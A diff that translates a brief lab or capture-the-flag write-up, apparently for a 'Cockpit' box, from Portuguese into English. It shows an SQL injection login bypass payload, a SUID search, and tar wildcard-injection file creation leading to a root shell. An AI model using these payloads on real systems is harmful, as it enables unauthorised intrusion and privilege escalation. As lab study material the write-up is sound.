@@ -1,37 +1,37 @@
 # Cockpit
 > SQL auth bypass + tar wildcard SUID
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
 ```
 
-Painel web Cockpit identificado.
+Cockpit web panel identified.
 
-## Exploração
+## Exploitation
 
-Bypass de autenticação via SQL injection no login:
+Authentication bypass via SQL injection on the login form:
 
 ```
 user: admin'--
-pass: qualquer
+pass: anything
 ```
 
-Acesso ao painel → upload de arquivo ou execução de comando.
+Panel access → file upload or command execution.
 
-Reverse shell obtido como www-data.
+Reverse shell obtained as www-data.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
-Binário `tar` com bit SUID e execução periódica com wildcard:
+`tar` binary with SUID bit and periodic execution with wildcard:
 
 ```
 find / -perm -4000 2>/dev/null
 ls -la /usr/bin/tar
 ```
 
-Criação de arquivos maliciosos para explorar wildcard:
+Creating malicious files to exploit the wildcard:
 
 ```
 echo "" > "--checkpoint=1"
@@ -44,4 +44,4 @@ chmod +x privesc.sh
 /tmp/bash -p
 ```
 
-Root obtido.
+Root obtained.
